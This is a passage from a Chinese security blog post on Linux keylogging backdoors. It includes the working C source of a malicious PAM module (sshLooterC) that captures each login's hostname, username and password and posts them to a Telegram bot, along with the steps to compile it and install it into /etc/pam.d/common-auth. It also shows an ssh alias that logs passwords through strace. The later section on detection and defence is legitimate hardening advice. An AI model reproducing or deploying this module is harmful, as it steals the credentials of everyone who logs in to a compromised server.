class="line"></span><br><span class="line">  <span class="comment">//原作者用的是tg,鉴于国内的环境应该是用不了的,所以我们可以简单修改一下这边的代码,让他发送到我们自己的远程服务器即可,要是想将其存储在本地也是直接改这个函数即可.</span></span><br><span class="line">  <span class="comment">//INSERT HERE YOUR BOT KEY</span></span><br><span class="line">  <span class="type">char</span> token[<span class="number">200</span>] = <span class="string">&quot;BOT TOKEN&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//INSERT HERE YOUR USER ID</span></span><br><span class="line">  <span class="type">int</span> user_id = <span class="number">1111111</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(url,<span class="number">600</span>,<span class="string">&quot;https://api.telegram.org/bot%s/sendMessage&quot;</span>,token);</span><br><span class="line">  <span class="built_in">snprintf</span>(data,<span class="number">300</span>,<span class="string">&quot;chat_id=%d&amp;text=%s&quot;</span>,user_id,*message);</span><br><span class="line">  CURL *curl;</span><br><span class="line">  curl_global_init(CURL_GLOBAL_ALL);</span><br><span class="line">  curl = curl_easy_init();</span><br><span class="line">  <span class="keyword">if</span>(curl) &#123;</span><br><span class="line">    curl_easy_setopt(curl, CURLOPT_URL, url);</span><br><span class="line">    curl_easy_setopt(curl, CURLOPT_POSTFIELDS,data); </span><br><span class="line">    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);</span><br><span class="line">    curl_easy_perform(curl);</span><br><span class="line">  &#125;                                       </span><br><span class="line">  curl_global_cleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PAM_EXTERN <span class="type">int</span> <span class="title function_">pam_sm_setcred</span><span class="params">( <span class="type">pam_handle_t</span> *pamh, <span class="type">int</span> flags, <span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv )</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PAM_EXTERN <span class="type">int</span> <span class="title function_">pam_sm_acct_mgmt</span><span class="params">(<span class="type">pam_handle_t</span> *pamh, <span class="type">int</span> flags, <span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PAM_EXTERN <span class="type">int</span> <span class="title function_">pam_sm_authenticate</span><span class="params">( <span class="type">pam_handle_t</span> *pamh, <span class="type">int</span> flags,<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv )</span> &#123;</span><br><span class="line">  <span class="type">int</span> retval;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* username;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* password;</span><br><span class="line">  <span class="type">char</span> message[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> hostname[<span class="number">128</span>];</span><br><span class="line">  retval = pam_get_user(pamh, &amp;username, <span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">  pam_get_item(pamh, PAM_AUTHTOK, (<span class="type">void</span> *) &amp;password);</span><br><span class="line">  <span class="keyword">if</span> (retval != PAM_SUCCESS) &#123;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">  &#125;</span><br><span class="line">  gethostname(hostname, <span class="keyword">sizeof</span> hostname);</span><br><span class="line">  <span class="built_in">snprintf</span>(message,<span class="number">2048</span>,<span class="string">&quot;Hostname: %s\nUsername %s\nPassword: %s\n&quot;</span>,hostname,username,password);</span><br><span class="line">  sendMessage(&amp;message);</span><br><span class="line">  <span class="keyword">return</span> PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line"><span class="built_in">cp</span> looter.so /usr/lib/x86_64-linux-gnu/security/</span><br><span class="line"></span><br><span class="line">vim /etc/pam.d/common-auth</span><br><span class="line"><span class="comment">#添加以下内容</span></span><br><span class="line">auth optional looter.so</span><br><span class="line">account optional looter.so</span><br></pre></td></tr></table></figure>

<p>远端服务器接受到密码信息:</p>
<p><img src="https://images.atsud0.me/images/post/20220315-23:03:59-_F57VVL_image-20220315230359527_F57VVL_1647356639929_F57VVL_image-20220315230359527.png" alt="image-20220315230359527"></p>
<h1 id="0x05-防御-amp-检测方式"><a href="#0x05-防御-amp-检测方式" class="headerlink" title="0x05 防御&amp;检测方式"></a>0x05 防御&amp;检测方式</h1><h3 id="1-查看进程"><a href="#1-查看进程" class="headerlink" title="1. 查看进程"></a>1. 查看进程</h3><p>查看用户进程,确认是否有sciprt -B \ starce等相关进程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux|grep script</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220315-15:29:20-_VYYX3I_image-20220315152920187_VYYX3I_1647329360471_VYYX3I_image-20220315152920187.png" alt="image-20220315152920187"></p>
<h3 id="2-查看用户默认shell的配置文件"><a href="#2-查看用户默认shell的配置文件" class="headerlink" title="2. 查看用户默认shell的配置文件"></a>2. 查看用户默认shell的配置文件</h3><p>以root身份或者是其他用户身份,对其他用户的bash配置文件进行检查,查看是否存在script等相关内容或者是 fakerc内容 配置文件中是否alias了一些敏感的程序<br>如:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date    &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -e read,write,connect  -s2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-x2F-bashrc-不可修改参数"><a href="#3-x2F-bashrc-不可修改参数" class="headerlink" title="3. ~&#x2F;.bashrc 不可修改参数"></a>3. ~&#x2F;.bashrc 不可修改参数</h3><p>以root用户对服务器上用户的相关配置文件加锁</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +i .bashrc</span><br></pre></td></tr></table></figure>



<p><img src="https://images.atsud0.me/images/post/20220315-15:56:15-_ixSP1u_image-20220315155615246_ixSP1u_1647330975507_ixSP1u_image-20220315155615246.png" alt="image-20220315155615246"></p>
<p>再次执行将会提示无权限操作.</p>
<p><img src="https://images.atsud0.me/images/post/20220315-15:57:15-_pvbnu4_image-20220315155715043_pvbnu4_1647331035292_pvbnu4_image-20220315155715043.png" alt="image-20220315155715043"></p>
<h3 id="4-查看用户家目录或tmp目录下是否存在记录终端历史记录的可疑文件"><a href="#4-查看用户家目录或tmp目录下是否存在记录终端历史记录的可疑文件" class="headerlink" title="4. 查看用户家目录或tmp目录下是否存在记录终端历史记录的可疑文件"></a>4. 查看用户家目录或tmp目录下是否存在记录终端历史记录的可疑文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bash_cache</span><br><span class="line">.script.lock</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<h3 id="5-检测trap-alias"><a href="#5-检测trap-alias" class="headerlink" title="5. 检测trap\alias"></a>5. 检测trap\alias</h3><p>可以检测是否有待执行的trap命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trap</span><br></pre></td></tr></table></figure>

<p>没有trap信号执行是无回显的,像这种情况是有待执行的命令的,可以使用以下命令进行清除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trap -- 信号名</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220316-14:58:16-_qBOSrj_image-20220316145816023_qBOSrj_1647413896307_qBOSrj_image-20220316145816023.png" alt="image-20220316145816023"></p>
<p>使用alias命令,列出目前所有别名命令</p>
<p><img src="https://images.atsud0.me/images/post/20220316-14:55:42-_Aowbm8_image-20220316145542554_Aowbm8_1647413742830_Aowbm8_image-20220316145542554.png" alt="image-20220316145542554"></p>
<p>若有可疑的别名命令,可使用以下命令进行清除(当前终端)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unalias -a #清除全部</span><br><span class="line">unalias ssh</span><br></pre></td></tr></table></figure>



<h3 id="6-检查-x2F-etc-x2F-pam-d-x2F"><a href="#6-检查-x2F-etc-x2F-pam-d-x2F" class="headerlink" title="6.检查&#x2F;etc&#x2F;pam.d&#x2F;"></a>6.检查&#x2F;etc&#x2F;pam.d&#x2F;</h3><p>通过阅读&#x2F;etc&#x2F;pam.d&#x2F;下的文件配置,检查是否有被修改. 关键的认证文件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/pam.d/common-auth</span><br><span class="line">/etc/pam.d/sudo</span><br><span class="line">/etc/pam.d/sshd</span><br><span class="line">/etc/pam.d/su</span><br><span class="line">/etc/pam.d/login</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<h3 id="7-检查LD-PRELOAD"><a href="#7-检查LD-PRELOAD" class="headerlink" title="7. 检查LD_PRELOAD"></a>7. 检查LD_PRELOAD</h3><p>检查环境变量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$LD_PRELOAD</span></span><br></pre></td></tr></table></figure>

<p>检查&#x2F;etc&#x2F;ld.so.preload是否存在并且是否有可以的动态链接文件。也可以使用<code>ldd</code>命令去查看程序动态加载了什么文件。</p>
<p>对于已经启动的进程，可以通过<code>pmap</code>命令来进行查看其加载的动态链接库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@debian-ttt:~<span class="comment"># pmap 4068</span></span><br><span class="line">4068:   sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups</span><br><span class="line">000055e885a63000     48K r---- sshd</span><br><span class="line">000055e885a6f000    512K r-x-- sshd</span><br><span class="line">000055e885aef000    292K r---- sshd</span><br><span class="line">000055e885b38000     16K r---- sshd</span><br><span class="line">000055e885b3c000      4K rw--- sshd</span><br><span class="line">000055e885b3d000     20K rw---   [ anon ]</span><br><span class="line">000055e887425000    264K rw---   [ anon ]</span><br><span class="line">00007f723456a000     12K r---- libnss_files-2.31.so</span><br><span class="line">00007f723456d000     28K r-x-- libnss_files-2.31.so</span><br><span class="line">00007f7234574000      8K r---- libnss_files-2.31.so</span><br><span class="line">00007f7234576000      4K r---- libnss_files-2.31.so</span><br><span class="line">00007f7234577000      4K rw--- libnss_files-2.31.so</span><br><span class="line">....................[省略一部分]</span><br><span class="line">00007f72350d3000     64K rw---   [ anon ]</span><br><span class="line">00007f72350e3000     12K r---- libwrap.so.0.7.6</span><br><span class="line">00007f72350e6000     20K r-x-- libwrap.so.0.7.6</span><br><span class="line">00007f72350eb000      8K r---- libwrap.so.0.7.6</span><br><span class="line">00007f72350ed000      4K r---- libwrap.so.0.7.6</span><br><span class="line">00007f72350ee000      4K rw--- libwrap.so.0.7.6</span><br><span class="line">00007f72350f4000      4K r---- b.so</span><br><span class="line">00007f72350f5000      4K r-x-- b.so</span><br><span class="line">00007f72350f6000      4K r---- b.so</span><br><span class="line">00007f72350f7000      4K r---- b.so</span><br><span class="line">00007f72350f8000      4K rw--- b.so</span><br><span class="line">00007f72350f9000      8K rw---   [ anon ]</span><br><span class="line">00007f72350fb000      4K r---- ld-2.31.so</span><br><span class="line">00007f72350fc000    128K r-x-- ld-2.31.so</span><br><span class="line">00007f723511c000     32K r---- ld-2.31.so</span><br><span class="line">00007f7235125000      4K r---- ld-2.31.so</span><br><span class="line">00007f7235126000      4K rw--- ld-2.31.so</span><br><span class="line">00007f7235127000      4K rw---   [ anon ]</span><br><span class="line">00007fff517f9000    132K rw---   [ stack ]</span><br><span class="line">00007fff5188d000     16K r----   [ anon ]</span><br><span class="line">00007fff51891000      8K r-x--   [ anon ]</span><br><span class="line"> total            13312K</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h1><p>本文以垃圾的文笔介绍了Linux键盘记录的相关后门,本文若有错误的地方 恳请师傅们指正.</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/links/">Friends</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-script%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8"><span class="toc-number">2.</span> <span class="toc-text">0x02 script键盘记录后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F"><span class="toc-number">2.1.</span> <span class="toc-text">Bash配置文件加载顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Script%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">Script命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CodeHz%E7%9A%84Bashrc-BackDoor"><span class="toc-number">2.3.</span> <span class="toc-text">CodeHz的Bashrc-BackDoor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.3.1.</span> <span class="toc-text">有意思的命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Strace-%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">0x03 Strace 记录密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85strace"><span class="toc-number">3.1.</span> <span class="toc-text">安装strace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-strace%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">方法一 strace启动进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-strace-%E5%B7%B2%E6%9C%89%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">方法二 strace 已有进程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-PAM%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-number">4.</span> <span class="toc-text">0x04 PAM记录密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2pam-unix-so"><span class="toc-number">4.1.</span> <span class="toc-text">替换pam_unix.so</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E7%BC%96%E8%AF%91%E6%9B%BF%E6%8D%A2"><span class="toc-number">4.1.1.</span> <span class="toc-text">手动编译替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E4%B8%80%E9%94%AE%E7%BC%96%E8%AF%91"><span class="toc-number">4.1.2.</span> <span class="toc-text">脚本一键编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PAM%E5%92%8CLD-PRELOAD%E5%8A%AB%E6%8C%81%E7%BB%93%E5%90%88DNS%E5%B8%A6%E5%A4%96%E5%8F%91%E9%80%81%E5%AF%86%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">PAM和LD_PRELOAD劫持结合DNS带外发送密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sshLooterC"><span class="toc-number">4.3.</span> <span class="toc-text">sshLooterC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E9%98%B2%E5%BE%A1-amp-%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">0x05 防御&amp;检测方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B"><span class="toc-number">5.0.1.</span> <span class="toc-text">1. 查看进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E9%BB%98%E8%AE%A4shell%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">5.0.2.</span> <span class="toc-text">2. 查看用户默认shell的配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-x2F-bashrc-%E4%B8%8D%E5%8F%AF%E4%BF%AE%E6%94%B9%E5%8F%82%E6%95%B0"><span class="toc-number">5.0.3.</span> <span class="toc-text">3. ~&#x2F;.bashrc 不可修改参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E5%AE%B6%E7%9B%AE%E5%BD%95%E6%88%96tmp%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E8%AE%B0%E5%BD%95%E7%BB%88%E7%AB%AF%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E7%9A%84%E5%8F%AF%E7%96%91%E6%96%87%E4%BB%B6"><span class="toc-number">5.0.4.</span> <span class="toc-text">4. 查看用户家目录或tmp目录下是否存在记录终端历史记录的可疑文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%A3%80%E6%B5%8Btrap-alias"><span class="toc-number">5.0.5.</span> <span class="toc-text">5. 检测trap\alias</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%A3%80%E6%9F%A5-x2F-etc-x2F-pam-d-x2F"><span class="toc-number">5.0.6.</span> <span class="toc-text">6.检查&#x2F;etc&#x2F;pam.d&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%A3%80%E6%9F%A5LD-PRELOAD"><span class="toc-number">5.0.7.</span> <span class="toc-text">7. 检查LD_PRELOAD</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%B0%8F%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">0x06 小结</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&text=Linux键盘记录后门"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&title=Linux键盘记录后门"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Linux键盘记录后门&body=Check out this article: https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&title=Linux键盘记录后门"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&name=Linux键盘记录后门&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&t=Linux键盘记录后门"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2024
    atsud0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "069018536ef0421ebc5bb5e449328773"}'></script>

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
